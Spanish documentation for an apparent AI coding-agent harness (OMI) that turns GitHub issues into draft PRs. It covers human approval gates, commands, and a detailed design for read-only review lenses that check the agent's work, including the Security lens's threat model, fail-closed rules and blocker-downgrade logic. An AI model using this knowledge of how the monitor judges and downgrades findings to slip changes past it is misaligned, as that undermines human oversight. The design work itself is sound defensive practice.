# Harness de desarrollo · hasta PR draft

Primer corte para **repos existentes con issues de GitHub**, sobre sesiones y tools nativas de Pi. Implementa Directa, Diagnóstico y Con spec. Por defecto no pregunta nada: arranca, aprueba su receta, corre los comandos y abre el PR draft solo. [Foundations](#foundations-comandos-y-permisos-por-repo) pone por repo cada uno de esos puntos en `ask`. No incluye la etapa Fundación (completar una base faltante), prototipos descartables ni perfiles/fallbacks de modelos. Después del PR draft, la persona puede seguir el mismo trabajo por [Review, correcciones, Land y Ship](#review-land-y-ship), con la configuración que guarda [`omi init --development`](#omi-init---development).

## Empezar y continuar

1. Pedí en el chat un cambio de código del repo que valga la pena seguir: feature, fix, mejora o chore con impacto. Preguntas, explicaciones, operaciones de OMI y cambios triviales que pedís hacer directo siguen en el chat normal, sin harness ni issue.
2. El agente propone empezar con la tool `omi_work_begin`:
   - si el pedido nombra un issue (`#N`), con ese issue;
   - si no, con un título y un cuerpo para clasificar antes de crear un issue. La sesión nueva no hereda el chat, así que el cuerpo tiene que traer el pedido completo.

   La tool no crea nada: deja un pedido de un solo uso, ligado a la sesión, y termina el turno. Si el agente la llamó junto con otras tools, Pi le da una respuesta más antes de terminar. Mientras el pedido se resuelve (la clasificación y, con `arranque: ask`, el sí), el resto de las tools del agente quedan bloqueadas. Un Esc en ese turno descarta el pedido sin preguntar.
3. Para un pedido nuevo sin issue, OMI primero clasifica en una llamada aislada al modelo, sin tools. Estima alcance, impacto, reversibilidad, verificación y riesgo usando el pedido completo, no líneas medidas ni código inspeccionado. Una política determinista aplica los [criterios configurables](#criterios-de-clasificación-previa):
   - **Chat:** continúa en la misma sesión sin issue, rama, worktree, sesión nueva ni harness. La evaluación es orientativa: siguen las reglas y permisos normales, y descubrir mayor impacto o riesgo exige volver a proponer harness.
   - **Falta información:** vuelve al chat con preguntas; hay que aclarar las ambigüedades antes de seguir. No se considera simple ni crea recursos.
   - **Harness:** reutiliza el triage obtenido y pasa a crear el issue.

   Esc, error, timeout o salida inválida detienen sin crear recursos, sin asumir trivialidad ni continuar automáticamente con cambios. Clasificar no concede permisos. Un issue existente siempre va por harness con su número; nunca se cierra, borra ni crea otro por esta decisión.

   Sólo si corresponde harness, OMI crea el issue, el worktree y la sesión sin preguntar, y avisa lo que hace. Con `arranque: ask` en Foundations, antes te pide **un solo sí**. Si Foundations tiene una revisión nueva, la aplica sola y avisa la diferencia. El diálogo (o el aviso) dice primero qué va a pasar. Si el issue es nuevo, lo muestra completo al final (repo, título y cuerpo). Dice también quién lo pidió: el motivo del agente, o que vino del panel de Issues. Lo que se puede comprobar sin efectos falla antes de preguntar:
   - el tamaño del pedido;
   - caracteres invisibles o de dirección de texto en el título o el cuerpo;
   - la identidad de una preparación guardada (también una anterior al registro, que se reconoce por su sesión), y que su worktree y su sesión sigan ahí;
   - que exista `main` local;
   - que la ruta del worktree no sea ajena;
   - el modo offline (`--offline` o `PI_OFFLINE`); en ese caso el panel tampoco ofrece Enter;
   - la falta de modelo o de confianza.
4. Al arrancar (sin preguntar, o con tu sí):
   - se crea el issue, si hace falta;
   - se reutiliza la clasificación previa del pedido nuevo; para un issue existente sin preparación se clasifica su tipo, y al retomar no se reclasifica;
   - se trae `main` de `origin` y se avanza sólo si es fast-forward, como un `git pull --ff-only`; después se prepara un worktree desde `main`, con su propia sesión. Si `main` tiene commits propios, cambios sin commitear que chocan o no hay red, no se toca: el worktree sale de `main` local y OMI avisa por qué;
   - se cambia a esa sesión y el trabajo sigue en Explorar.

   Con `arranque: ask`, si decís que no, no se crea issue, worktree, sesión ni trabajo.
5. Explorar no habilita escrituras. Respondé las preguntas. Por defecto la receta se aprueba sola. Con `receta: ask`, la aprobás completa en la UI. La aprobación autoriza implementación y commits locales, no push ni grants de comandos. La revisión permite inspeccionar los comandos exactos de los casos D, que al ejecutarse siguen Foundations y las confirmaciones independientes. Si volvés/cancelás, el agente puede rehacer la receta conservando exploración y respuestas.
6. El agente implementa, verifica, publica la rama y abre un PR draft. Con `push_pr: ask` en Foundations, antes pide otro sí, sobre el cuerpo exacto del PR. El cuerpo lleva `Closes #N`: GitHub cierra el issue cuando una persona mergea el PR.

**Enter iniciar trabajo** (o **retomar trabajo**) en el panel de Issues y «Trabajar en el issue seleccionado» en la paleta entran por el mismo camino (con `arranque: ask`, piden el mismo sí). Si el issue ya tenía worktree y sesión, se retoman sin reclasificar ni volver a leer sus etiquetas. Un trabajo guardado sigue desde su etapa, sin duplicarse, y el diálogo dice en cuál está. Si estaba pausado, el arranque lo reanuda (el diálogo o el aviso lo dice), como `/omi-work resume`, sin conceder aprobaciones. Si algo falla después de crear el issue, el aviso trae su número: hay que pedir ese issue, no crear otro.

No hay un comando para empezar: `/omi-triage` y `/omi-work start` ya no existen. Una tool no puede cambiar de sesión, así que el pedido viaja como un comando interno con un token de un solo uso, que vive sólo en la memoria del proceso. Escribir ese comando a mano, sin un token vigente, no hace nada. Con el harness activo, `omi_work_begin` no se ofrece. Un arranque y `/omi-main` no corren a la vez: los dos cambian de sesión.

| Comando humano | Efecto |
|---|---|
| `/omi-work resume` | Adoptar explícitamente el estado guardado; no repite comandos ya hechos. Si estaba pausado, reanuda sin conceder aprobaciones. |
| `/omi-work approve` | Aprobar receta/spec vigente y escribirla en la sección del harness del issue. Revalida fuente y código explorado. |
| `/omi-work accept-risk` | Sólo una persona, en la TUI y en Verificar, con el checkout limpio. Muestra los hallazgos blocker de Seguridad sin aceptar del contenido actual, qué implica y el contenido (issue, HEAD y huella). Si la revisión fue parcial, lo dice con sus avisos: aceptar no revisa la parte que quedó sin resultado o `unknown`, y Seguridad no se vuelve a correr sobre ese contenido; para revisarla, el agente usa `retry`. Ctrl+S y después el motivo; Esc o un motivo vacío no aceptan nada. Valen sólo para ese contenido y esos textos exactos: dejan de frenar Verificar y Land, también el auto-Land. No corrige nada ni autoriza push, merge, comandos ni workflows. Queda en el estado, en la sección del issue y en el PR draft. Retry, refresh y replan lo borran. Adopta el estado guardado sin reanudarlo: si estaba pausado, sigue con `resume`. |
| `/omi-work extra-round` | Sólo una persona, en la TUI, con 0 retry, en Implementar, Verificar o PR draft. Suma una vuelta con su motivo: «vuelta 3 de 3» pasa a «vuelta 3 de 4». Tope: 10 vueltas; para seguir, `refresh`. No borra evidencia, pasos ni aprobación, y no acepta riesgos. No aplica con el PR adoptado. Adopta el estado guardado sin reanudarlo. |
| `/omi-work pause` | Pausar conservando fase, decisiones, archivos y evidencia. |
| `/omi-work refresh` | Opcional. Volver a leer el pedido y explorar; invalida receta, decisiones y pruebas activas. También reabre un trabajo que el agente cerró sin cambio. Si lo propone el agente, pide confirmación sólo con `receta: ask`. Un cambio de alcance dicho en el chat no lo necesita. |
| `/omi-work pr` | Revalidar, hacer push normal y abrir el PR draft, uno por grupo si hay [stack](#stack-de-prs) (con `push_pr: ask`, antes pide el permiso); después actualiza la sección del issue con la evidencia. |
| `/omi-work stack` | Actualizar un [stack de PRs](#stack-de-prs) publicado: mergea el de abajo en el de arriba y re-apunta a `main` el que quedó sobre uno mergeado. Sigue la misma política que el push: con `push_pr: ask` pide el sí. |
| `/omi-work status` | Consultar el estado sin llamar al modelo, con la revisión de Foundations vigente, sus políticas y sus patrones de confirmación en lista vertical. |
| `/omi-work foundations` | Abrir la guía de Foundations, como **f** en la vista OMI o `/omi-foundations`. No inicia ni retoma trabajo, no acepta ni guarda al abrir; sólo Guardar explícitamente persiste v2. |
| `/omi-permitidos` | Ver y quitar, con un sí, los comandos que no vuelven a preguntar en este repo: los que se guardaron con «Sí, y no volver a preguntar». No cambia la KB. |
| `/omi-setup` | Correr [lo que falta configurar](#setup-de-lo-que-falta): la guía de Foundations y después el wizard del lifecycle, también lo postergado. Sin nada para correr, muestra el diagnóstico. Como «Configurar lo que falta» en la paleta (Ctrl K) o **s** en la [pestaña OMI](#pestaña-omi). |
| `/omi-work stop` | Salir explícitamente del flujo y restaurar las tools normales del chat, sin borrar ni revertir archivos. También sale de un harness bloqueado (estado inválido o atrasado) sin tocar el estado guardado. |
| Ctrl 6 / `/omi-workflow` | Pantalla 6 · Progreso: recorrido completo de sólo lectura, también con la lateral oculta. |
| `/omi-progress` | Detalle del progreso en el workspace TUI, también con la lateral oculta. |

Restaurar una sesión o recargar OMI **no ejecuta** pruebas, modelo, commits ni publicaciones. `resume` es una acción humana explícita. En offline se puede restaurar/consultar el estado local; empezar, contrastar el pedido, aprobar una receta nueva o publicar necesita GitHub. Para abrir offline la sesión de un issue preparado, usá `/resume` de Pi. En el modo clásico se conserva el status y `/omi-work status`, no el panel del workspace.

## Criterios de clasificación previa

Los criterios viven en las **perillas del producto de la KB de Harness**, igual que las otras perillas del repo. Son datos, no instrucciones ni permisos. Bloque independiente de `omi-foundations`, con identidad de repo y versión:

````md
```omi-development-triage
{
  "version": 1,
  "repo": "chichex/omi-code",
  "chat": {
    "enabled": true,
    "maxScope": "localized",
    "allowedImpacts": ["cosmetic", "documentation", "local-behavior"]
  }
}
```
````

- `enabled: false` exige harness para todo pedido nuevo suficientemente definido. Un issue existente siempre lo exige.
- `maxScope`: `localized` (un punto, default) o `module` (un módulo). Trabajo transversal siempre requiere harness. Es una estimación motivada desde el pedido, no una cantidad verificada de archivos o líneas.
- `allowedImpacts`: lista única de cero a tres valores `cosmetic`, `documentation`, `local-behavior`. Sólo esos impactos pueden seguir en chat. La lista vacía no habilita ninguno.
- Reversibilidad y verificación clara son requisitos fijos. Seguridad, auth, permisos, secretos, pagos, datos personales, migraciones, infraestructura, contratos públicos y el propio harness siempre requieren seguimiento aunque cambie una línea. Incertidumbre, dimensiones desconocidas o preguntas pendientes primero vuelven para aclararse, sin recursos.
- JSON estricto, todos los campos obligatorios y sin extras. Bloque duplicado, JSON inválido, repo no identificable o cerca sin cerrar detiene el pedido sin recursos. Un bloque identificable de otro repo no aplica.
- La lectura reutiliza la conexión y las perillas ya leídas por el host, sin tools del modelo ni escrituras KB. Se fija en la sesión y sobrevive `/reload`. No acepta Foundations, escribe confianza ni cambia sus tres políticas, hashes o revisiones. Cambiar estas perillas se hace en la KB; este flujo sólo las lee, sin wizard ni guardado automático.
- Sin bloque aplicable, sin producto, sin KB/login, MCP desactivado o KB caída, usa el **default conservador del ejemplo**, con aviso explícito. No usa un resultado de clasificación fallido como default: una evaluación inválida siempre detiene. No guarda un caché persistente nuevo de criterios; al abrir otra sesión vuelve a leerlos.
- La clasificación no es una frontera de seguridad y no inspecciona código: puede estimar mal. Nunca sustituye las reglas y permisos del proyecto. Si al continuar el chat aparece mayor alcance o riesgo, el agente debe proponer el harness. La ruta **Directa** es distinta: sigue dentro del harness, con receta, evidencia y seguimiento.

## Revisar y aprobar una receta

La TUI presenta una revisión dedicada, no un volcado JSON en un confirm genérico. Abre en **Resumen** con issue, objetivo, qué cambia, alcance, tipo, ruta, tamaño, riesgo y ejecutor. Las secciones **Enfoque**, **Alcance**, **Pasos**, **Pruebas**, **Inferencias**, **Spec**, **Autorización** y **Fuente** conservan los detalles completos. Las huellas técnicas quedan en Fuente, no como contenido principal.

- **←/→**, **Tab / Shift+Tab**: cambiar de sección. **1–9**: ir directamente a una sección.
- **↑/↓**, **PgUp/PgDn**, **Home/End** y rueda: desplazar el cuerpo de la sección. El título informa posición y total; ayuda y decisiones quedan fuera del cuerpo desplazable.
- **Ctrl+S**: aprobar deliberadamente. **Enter no aprueba**. **Esc**, **Ctrl+C**, **Ctrl+D** o cerrar/abortar: volver sin conceder aprobación ni escribir en el issue. Se puede ajustar y revisar de nuevo sin perder exploración ni respuestas.
- **Pruebas** muestra cada caso con descripción y comando completo. `│` inicia una línea lógica, `↳` marca continuación visual y `↵` un salto real. No se pierden espacios al envolver comandos. Los backslashes se duplican (`\\` representa `\`); tabulaciones, retornos, controles y caracteres invisibles se muestran como escapes (`\t`, `\r`, `\uXXXX`), nunca como secuencias ejecutables del terminal. La leyenda de la sección los escribe igual que en los comandos. Navegar no ejecuta comandos ni exige visitar todas las secciones para habilitar el sí.
- El marco adapta ancho/alto al terminal y al tema vigente, incluidos 80×24 y resize. Si el pane ya no permite inspección (menos de 32 columnas de revisión o 14 filas de terminal), se suspende aprobar hasta ampliarlo; Esc sigue cancelando.

El sí autoriza **implementar, commits locales y mantener la sección del harness al final del cuerpo del issue**, sin tocar el pedido de arriba. No autoriza push, merge, workflows ni deploy, ni concede grants a los D. Una receta humana o `receta: auto` (el default) nunca dispensa el sí explícito que exige Foundations v2 por patrones o sintaxis. Sin Foundations v2 aceptada nada pregunta, y con una v2 sin reglas tampoco; con reglas, sólo las líneas simples no coincidentes corren solas, y un grant humano exacto del trabajo/pedido evita repetir ese sí. La etiqueta, incluido setup, no cambia estas reglas (ver «Evidencia y permisos»). La receta no tiene un tope propio de tamaño: la revisión navega por secciones. Antes del sí sólo se comprueba que el cuerpo del PR draft entre en GitHub; si no entra, falla pidiendo dividir el trabajo, no se resume en silencio para aprobarla.

En RPC, donde Pi no ofrece componentes TUI, se conserva una confirmación humana con el mismo documento completo organizado en texto, con los mismos escapes y marcadores `│`/`↵` en los comandos. Los modos sin UI no pueden aprobar. Tras revisar se vuelve a contrastar la fuente, el estado guardado y el código explorado; una revisión obsoleta no se convierte en aprobación de otra receta.

## Etapas y rutas

- **Explorar:** referencias a archivos/líneas leídos por tools y todavía vigentes, hallazgos, enfoque, base faltante y dependencias. El inspector permite consultar el diff completo (si es grande, por partes, con `diffPart`), hasta 20 commits y hasta 20 issues abiertos/cerrados mediante una búsqueda por título; no es un censo exhaustivo de duplicados. Una búsqueda fallida no se presenta como vacía exitosa.
- **Resolver inferencias:** checkpoint explícito, incluso con lista vacía. Cada inferencia tiene tipo qué/cómo, recomendación, confianza y reversibilidad. Umbral inicial fijo: 80/100. Las del cómo sin evidencia y las irreversibles siempre requieren respuesta humana. La confianza es una estimación del agente, no una probabilidad calibrada.
- **Receta:** tipo, tamaño, riesgo y ejecutor, objetivo, enfoque, alcance/fuera de alcance, casos D y comandos exactos, lentes. Inline por defecto; delegación por las primitivas existentes, hasta cuatro escritores y respetando el tope de la receta. El filesystem sigue siendo compartido: no hay reservas ni sandbox por archivo.
- **Directa:** trabajo chico con causa/enfoque entendido; genera un paso C1 sin spec pesada.
- **Diagnóstico:** bug sin causa conocida. Pide reproducción observada y causa; después el arreglo sigue como Directa o Con spec según su tamaño. No habilita arreglos durante el diagnóstico.
- **Con spec:** trabajo grande. Exige por qué, pasos C con cobertura explícita de todos los D y playbook humano antes de aprobar. Puede agrupar los pasos en un [stack de PRs](#stack-de-prs).
- **Implementar:** un C activo por vez, test rojo real, mismo comando verde, commit convencional nuevo por paso. No se completa un paso mediante texto del modelo. Antes del commit del último C, el agente corre con `setup` los gates que va a correr en Verificar (por ejemplo, la suite completa), con un `timeoutSeconds` que alcance. Setup no acredita, pero un test o un fixture viejo se arregla en el mismo paso; después repite el verde. El agente termina todos los C, también en la última vuelta: al commitear el último, el host pasa a Verificar solo. Ejemplo: en #99 los fixtures viejos de la ayuda aparecieron recién con el gate de Verificar.
- **Verificar:** cada D con su comando aprobado, salida/exit code y contenido actuales; gates ejecutados y lentes solicitados. Seguridad y Cumplimiento son obligatorios con riesgo alto. Los lentes son llamadas de sólo lectura, sin tools ni conversación del implementador; no sustituyen la Review externa del PR.
  - **Qué ven.** Los casos D, el alcance, el diff completo y la evidencia que registró el harness, no el modelo: por caso D su última verificación; por paso C su historial rojo→verde con comando, etiqueta, exit code, HEAD, fingerprint y la salida que ya se guarda. Un paso de una vuelta anterior trae su rojo y su verde acreditados, archivados.
    - **Precedentes de Explorar.** Por cada referencia que citó Explorar, las líneas de la base (antes del cambio) que el host lee con Git, de sólo lectura: la citada y 3 alrededor. Van con su `path`, su `line` y la nota del implementador, rotulada como tal (`detail`: no es evidencia). El lente de Seguridad no recibe esa nota. Tope: 20.000 caracteres; lo que no entra se cuenta en `omitted`. El lente los usa como vara: no exige más de lo que el repo ya hace en el código equivalente ni pide contradecir una decisión documentada. La vara no baja un escenario concreto de explotación que el diff introduce: un secreto expuesto, una exfiltración, una inyección desde contenido no confiable o saltear una salvaguarda que pide a una persona siguen siendo blocker aunque el repo haga algo parecido en otro lado. El agente elige qué cita Explorar: un precedente citado no puede volver aviso una inyección. Ejemplo: en #98, resilience pidió recuperar locks huérfanos y el agente lo hizo con `kill(pid, 0)`, contra `src/harness/store.ts:22-23` (un lock abandonado jamás se roba), y security lo castigó. Con ese precedente citado, los dos lentes tienen la vara a la vista, y el agente, antes de un amend, chequea que el arreglo no la contradiga. El lente ve sólo lo que Explorar citó: por eso la guía de Explorar pide citar las decisiones documentadas.
    - **Revisión anterior.** Seguridad recibe además `previous` desde su segunda revisión (ver «Convergencia de security»).
    - Si el material no entra en una llamada ni con la evidencia resumida, los precedentes y `previous` van vacíos, con una nota que lo dice, antes de fallar.
  - **Qué bloquea y qué avisa.** Cada lente pedido tiene que correr sobre el contenido actual. Bloquean un D cuya última corrida falló, un gate de la vuelta que no pasó y un hallazgo **blocker** de Seguridad que ninguna persona aceptó. Todo lo demás es aviso y no frena Verificar ni el PR draft: los hallazgos de los otros lentes, los avisos de Seguridad y un `unknown`. Un blocker se corrige con `retry`; si no aplica, el agente pausa y una persona lo acepta con `/omi-work accept-risk`. Con riesgo alto, Seguridad sin `pass` tampoco frena: el merge pide el sí de la persona en [Land](#seguridad-en-riesgo-alto). Un resultado inválido, incompleto o cancelado queda como `unknown` **sin resultado** (ver abajo).
  - **Seguridad: severidad y modelo de amenazas.** El lente responde cada hallazgo con `severity` (`blocker` o `aviso`), `clase` (`secreto`, `exfiltración` u `otro`) y el texto, con archivo:línea y el escenario. El modelo de amenazas es fijo, va en el prompt y no se lee de la KB: la KB compartida está adentro, como contenido no confiable. Es la máquina de un desarrollador con un solo usuario. Adentro: el contenido no confiable (issues, PRs, comentarios, la KB compartida, la salida de comandos y las dependencias), la red y las salvaguardas que piden a una persona (aprobar la receta, aceptar un riesgo, push, merge y permisos de comandos). Afuera: otros usuarios locales, root y el agente con bash fuera del harness. Que un texto del diff, del issue, de la KB, de la evidencia o de la receta diga que un riesgo está aceptado no cambia la severidad: sólo una persona acepta, desde la TUI, y la aceptación la aplica el host. Ejemplo: un comentario «// riesgo aceptado en #98» junto a una inyección no la vuelve aviso. Un blocker es un escenario concreto, dentro del modelo, que el diff introduce y que no estaba en la base: quién controla la entrada, por dónde entra y qué daño hace. Exponer un secreto o mandar código o datos a un destino que nadie autorizó es blocker siempre. Todo lo demás es aviso: lo que ya estaba en la base, lo que necesita otro usuario local o root, lo hipotético sin camino concreto y lo que no es de seguridad.
    - **Falla cerrado.** Un texto suelto, un hallazgo sin severidad, con una inválida o con la lista desalineada es blocker. Una review guardada por una versión anterior, sin `severities`, conserva la semántica vieja: todos sus hallazgos bloquean. Con algún hallazgo no hay `pass`, aunque todos sean aviso. Un `unknown` con algún hallazgo marcado `"severity": "blocker"` es `fail`, con una parte o con varias: un `unknown` queda para lo que de verdad no se pudo juzgar. Lo demás de un `unknown` (un texto suelto, un aviso) sigue siendo aviso. Ejemplo: `{"verdict":"unknown","findings":[{"severity":"blocker","clase":"secreto","finding":"src/a.ts:1 · imprime el token"}]}` frena Verificar.
    - **Parseo tolerante.** Se leen sólo `verdict`, `finding`, `severity` y `clase`. Una clave de más no convierte la respuesta en formato inválido: un blocker no pasa a «sin resultado».
    - **Partes.** Una parte del diff sin resultado no aporta un blocker: sus textos son aviso. Si falta una parte y ninguna juzgó un blocker, el lente queda sin resultado y se vuelve a correr. Una parte en `fail` sin hallazgos aporta el blocker «El lente de seguridad falló sin detallar hallazgos».
    - **Refuter.** Un `pass` del refuter no levanta un blocker sin aceptar ni deja repetir el lente sobre ese contenido.
    - **Cómo se ve.** El progreso, la sección del issue y el PR muestran cada hallazgo con su severidad adelante (`blocker · …` o `aviso · …`). El lente dice «bloquea · la persona puede aceptarlo con /omi-work accept-risk» o «riesgo aceptado por una persona». `severities` se guarda sólo en un `fail` con algún aviso (ver [Compatibilidad con binarios anteriores](#compatibilidad-con-binarios-anteriores)).
    - **Ejemplos.** Una ACL extendida de macOS o el espacio de PID de otro usuario son aviso: necesitan otro usuario o root. Un guardado de la KB sin CAS que ya estaba en `main` es aviso. Un valor de la KB compartida que elige a qué proveedor va el diff es blocker. Una acción de `omi_workflow` que acepta un riesgo o aprueba la receta sin la persona es blocker.
  - **Convergencia de security.** Desde la segunda revisión de Seguridad del mismo pedido (también si la anterior quedó archivada por un retry), el host compara con la anterior. Calcula con Git, de sólo lectura, los archivos que cambiaron desde el commit del paso cuyo verde acreditó el contenido revisado, y el árbol de HEAD.
    - El lente recibe `previous`: sus hallazgos de entonces (los blocker primero, hasta 10, de hasta 500 caracteres cada uno, salvo los aceptados, que van enteros) y `changedFiles` (hasta 200). Primero dice si cada blocker anterior sigue.
    - Un blocker nuevo de clase `otro` que cae en un archivo sin cambios, que está en HEAD y que no es el de un blocker anterior baja a aviso, con el prefijo «bajado a aviso: archivo sin cambios desde la revisión anterior · …». El veredicto sigue en `fail`: sólo cambia la severidad. El aviso de `omi_workflow_lens` dice cuántos bajó.
    - Nunca baja un secreto, una exfiltración, un hallazgo sin clase o con una clase inválida, sin archivo o con un archivo que no está en HEAD, ni uno cuyo texto nombra un secreto (por ejemplo, `token`, `password` o `auth.json`).
    - Mira todo el texto, no sólo el primer tramo, y busca en él cada archivo que conoce como subcadena, completo o por sus finales después de una «/», con límites de ruta: no adivina la forma de una ruta (`Makefile`, `src/acción.ts`, `src/a=b.ts`, `posts.$id.tsx`, `src/run task.ts`, entre «» o «“”», en negrita, con `#L12` o con una flecha pegada). `src/lib.ts` o `src/b.ts.bak` no nombran a `src/b.ts`. No baja si nombra un archivo cambiado o el de un blocker anterior, escrito completo o corto, o si cita con línea un archivo que no está en HEAD. Ejemplo: «src/c.ts:4 · el sumidero ejecuta lo que recibe; lo dispara src/b.ts:10» sigue blocker si cambió `src/b.ts`, aunque `src/c.ts` no haya cambiado. Por eso el lente cita cada archivo del escenario.
    - Si no puede comparar (no encuentra el commit, Git falla o un blocker anterior no cita su archivo), no baja nada y el progreso lo dice: «sin comparación con la revisión anterior: no se baja ningún blocker».
    - Las rutas de los blockers anteriores se resuelven contra el árbol de HEAD y los archivos cambiados (un archivo borrado está entre los cambios). Una ruta corta vale por todas las que terminan así. Ejemplo: la base citó «store.ts:22» y ahora el lente cita «src/harness/store.ts:30»: es el archivo de un blocker anterior y no baja. Si un blocker anterior cita un archivo que no está en ninguno de los dos, no compara: «…un blocker anterior cita un archivo que no está en el árbol; no se baja ningún blocker».
    - Una revisión parcial no es base. Si alguna parte del diff quedó sin resultado o `unknown` (también un `unknown` que un blocker marcado volvió `fail`), la review se guarda con `partial` y la vuelta siguiente no compara. `partial` no cambia si frena: frena sólo si tiene un blocker sin aceptar, como cualquier otra. Lo que cambia es que no es base: «sin comparación con la revisión anterior: no revisó todas las partes del cambio; no se baja ningún blocker». Ejemplo: la parte 2 de 2 quedó sin resultado y la parte 1 tuvo un blocker. Tras el retry, un blocker nuevo «otro» en un archivo de la parte 2 sigue blocker: nadie la revisó.
    - Lo que una persona aceptó sobre la base llega al lente en `previous` con `accepted: true` y entero, sin el recorte de 500 caracteres, y el lente lo repite con su texto exacto si sigue. Su ruta vale como la escribió la persona: «store.ts:22» se resuelve contra el árbol. Si reaparece con el mismo texto (sin el prefijo de parte ni espacios de más), en archivos sin cambios y con clase `otro`, baja a aviso con el prefijo «bajado a aviso: repite en un archivo sin cambios un riesgo que aceptó una persona · …». La persona aceptó un texto, no un archivo: otro hallazgo en ese archivo, o el mismo dicho de otra forma, sigue blocker por ser el archivo de un blocker anterior. Ejemplo: la persona acepta «src/a.ts:1 · permiso abierto» sobre X; un gate rojo obliga a un amend y el contenido pasa a Y sin tocar `src/a.ts`. El mismo texto sobre Y avisa y no frena; «src/a.ts:40 · inyección…» frena. También vuelve a frenar si `src/a.ts` cambió, si es un secreto o una exfiltración, o después de un `retry`, que borra la aceptación. Sigue igual en los amends siguientes de la vuelta: si la base ya lo bajó como repetido y una persona aceptó ese texto en esta vuelta, se sigue reconociendo y su archivo sigue protegiendo la regla del blocker anterior. La aceptación en sí sigue valiendo sólo para X. La clase no se guarda en el estado.
    - Ejemplo: C1 cambia `value.cjs` y Seguridad marca un blocker ahí. Tras el retry, C2 toca sólo `extra.cjs`. Un blocker nuevo «otro» en `other.cjs:1` baja a aviso y `verified` llega al PR. En `extra.cjs` o en `value.cjs`, o con clase `secreto`, sigue blocker. Así cada vuelta revisa lo que cambió y no reabre lo ya juzgado: en #98, la vuelta 1 pidió dueño y permisos, y la 3, ACL y PID.
  - **Reintento por parte.** Cada parte es una llamada con plazo propio de 5 minutos y hasta 3 intentos, con 2 s y 4 s de espera entre ellos. La espera se corta si la persona cancela. Se reintenta sólo lo transitorio: un error de conexión (por ejemplo, «Unable to connect», `ECONNRESET`, `ECONNREFUSED`), un proveedor saturado (`overloaded`, 529, 5xx, rate limit, según el clasificador de Pi), o el plazo vencido. Un corte por longitud o un JSON inválido se reintenta una sola vez. No se reintentan cuota, facturación ni autenticación, ni la cancelación de la persona. Nunca se reintenta un veredicto válido, tampoco un `unknown` del modelo: eso sería tirar de nuevo el dado. El uso suma todos los intentos. Si el proveedor no responde ni al abort, se lo deja de esperar a los 10 s. Cada llamada admite hasta 16.384 tokens de salida, para modelos que piensan y responden con el mismo tope. Reintentar no repite efectos: el lente no tiene tools.
  - **Sin resultado.** Si se agotan los intentos, la parte queda `unknown` con `noResult` y un hallazgo con la causa por categoría, nunca el error crudo del proveedor, que iría al issue y al PR. Ejemplo: «parte 1/2 · Sin resultado del lente: conexión (3 intentos)». Las categorías son conexión, proveedor no disponible, tiempo agotado, respuesta cortada por longitud, formato inválido, cuota o facturación, autenticación y error del proveedor. Un lente cancelado o cuyo cambio se modificó durante la corrida también queda sin resultado. El lente entero queda sin resultado sólo si ninguna parte juzgó `unknown`; un `fail` de una parte sigue siendo `fail`. El progreso, la sección del issue y el PR lo muestran como «⚠️ unknown · sin resultado», y el `refuter` no lo recibe como hallazgo. El agente lo vuelve a correr antes de `verified`, porque no gasta veredictos; si vuelve a quedar sin resultado, queda como aviso. Un `fail` o un `unknown` juzgado por el lente no se repiten.
  - **Corrección liviana (`amend`).** Corrige sin gastar vuelta un D o un gate rojo (exit 1–125) sobre el contenido limpio, o un aviso de cualquier lente, también de Seguridad. El agente usa `amend` con el motivo: agrega un paso `C<n>` con su rojo, verde y commit, sin borrar evidencia ni revisiones. Después repite los D, el gate que falló, Seguridad y los lentes que no aprobaron limpio; un lente que aprobó limpio el contenido de partida vale y el PR lo marca «revisado antes de la corrección liviana». Hasta dos por vuelta, compartidos entre rojos y avisos: un aviso que queda va en el PR, y un rojo sin amend pide `retry`. Antes de un amend, el agente chequea que el arreglo no contradiga una decisión documentada (un comentario del código, AGENTS.md o docs/); si la contradice, lo deja como aviso.
    - Ejemplo: `npm test` falla por un fixture de la ayuda que el cambio dejó viejo. `amend` agrega C6 con su rojo, verde y commit, se repite `npm test` sobre el contenido nuevo y sigue siendo la misma vuelta. Antes, eso gastaba un retry (#99 gastó 2 de 3 así).
    - **Regla de gates.** Para cada gate corrido en la vuelta vale su última corrida sobre este contenido o, si no se repitió después de un amend, la última que pasó o falló de verdad (un rojo, un crash repetido o un corte en el tope). Ejemplo: un gate crasheó dos veces sobre A con 139 y el amend llevó a B: `verified` sobre B exige repetirlo. Una corrida interrumpida sobre este contenido frena hasta volver a correrla; una de un contenido anterior no cuenta. Ejemplo: `npm test` falló sobre A y el amend llevó a B: `verified` sobre B exige repetir `npm test`, porque el rojo de A manda mientras no se repita. Un rojo que no se reproduce al volver a correrlo no necesita amend: vale la última corrida. La guía de Verificar dice esta misma regla y un test la compara con el reducer.
    - **126/127.** El comando no existe o no es ejecutable: nunca corrió. No es un rojo del cambio ni cuenta como gate de la vuelta: se corrige el comando y se vuelve a correr. Un D de la receta con 126/127 tampoco es un rojo que justifique amend: el agente pausa con el motivo, porque hay que corregir la receta.
    - Se rechaza con un blocker de Seguridad sin aceptar (eso pide `retry`) y con una corrida interrumpida (sin código, por señal o por timeout): se vuelve a correr, con el `timeoutSeconds` que sugiere OMI.
    - **Crash repetido.** Si un D o un gate muere dos veces seguidas por la misma señal (exit 128 o más) sobre el mismo contenido, es un crash del cambio y cuenta como rojo: `amend` lo corrige y, sin amends, `retry` abre la vuelta. Ejemplo: `npm run test:native` da 139 (SIGSEGV) dos veces sobre B. Antes quedaba sin salida: volver a correrlo daba lo mismo y `retry`, `amend` y `verified` se rechazaban. Una sola muerte, otra señal o un corte sin código se vuelven a correr.
    - Con un riesgo aceptado sobre ese contenido, un amend por avisos se rechaza: cambiaría el contenido y la aceptación dejaría de valer. Un D o un gate rojo sí se corrige.
    - Un lente sin resultado no es un hallazgo y tampoco justifica `amend`: se vuelve a correr.
  - **Sin tope de tamaño.** Si el diff no entra en una llamada, se reparte por archivo en partes. Un archivo más grande se corta por líneas, con una etiqueta por fragmento. El lente corre por parte, con los casos y la evidencia en cada una, y se combina: el peor veredicto gana (`fail`, `unknown`, `pass`) y se juntan los hallazgos con su parte. Nada se trunca en silencio.
